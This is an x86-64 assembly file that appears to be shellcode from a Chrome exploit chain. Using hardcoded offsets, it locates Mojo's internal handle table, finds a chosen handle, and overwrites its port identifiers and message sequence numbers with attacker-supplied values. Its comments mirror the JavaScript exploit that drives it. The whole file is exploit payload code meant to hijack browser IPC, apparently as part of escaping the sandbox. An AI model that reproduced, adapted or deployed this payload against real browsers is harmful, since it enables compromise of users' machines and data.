bits 64

SECTION .TEXT
	GLOBAL _start

_start:
    push rsi
    push rcx
    push rdi
    push rdx

    xor rbx, rbx
    mov rax, r14

    ; Get ArrayBuffer backing
    mov rdi, [rax+0x10]
    mov rdi, [rdi]

    ; Get xsktFreeLocale
    mov rax, [rax+0x18]
    mov rax, [rax]
    mov rax, [rax]

    ; let MojoGetTimeTicksNowImpl = val2 + 0xa4e040n;
    ; let g_core_ptr_ptr = MojoGetTimeTicksNowImpl + 0x6ff23e5n + 0xbn;
    add rax, 0xa4e040
    add rax, 0x6ff23e5
    add rax, 0xb

    mov rax, [rax]
    ; let handle_table_ptr = g_core_ptr + 0x40n;
    add rax, 0x40
    ; let handle_table = await ptrAt(handle_table_ptr);
    mov rax, [rax]
    ; let map_handles_ptr = handle_table + 0x18n;
    add rax, 0x18

    mov rsi, rdi
    add rsi, 0x800

    ; Expect the handle number in buffer[0x100]
    mov rdx, [rsi]
loop:
    ; let map_handles     = await ptrAt(map_handles_ptr);
    mov rax, [rax]
    test rax, rax
    je done

    ; Count the amount of entries
    inc rbx

    ; handle = await ptrAt(map_handles + 0x08n);
    mov rcx, rax
    add rcx, 8
    mov rcx, [rcx]

    cmp rcx, rdx
    je patch

    jmp loop

patch:
    db 0xcc
    add rax, 0x18
    mov rax, [rax]

    add rsi, 0x08
    mov rdx, [rsi]
    mov [rax+0x30], rdx  ; Seq

    add rax, 0x28
    mov rax, [rax]

    add rsi, 0x08
    mov rdx, [rsi]
    mov [rax+0x18], rdx  ; Port v1

    add rsi, 0x08
    mov rdx, [rsi]
    mov [rax+0x20], rdx  ; Port v2

    add rsi, 0x08
    mov rdx, [rsi]
    mov [rax+0x28], rdx  ; Message sequence number

done:
    pop rdx
    pop rdi
    pop rcx
    pop rsi
    ret
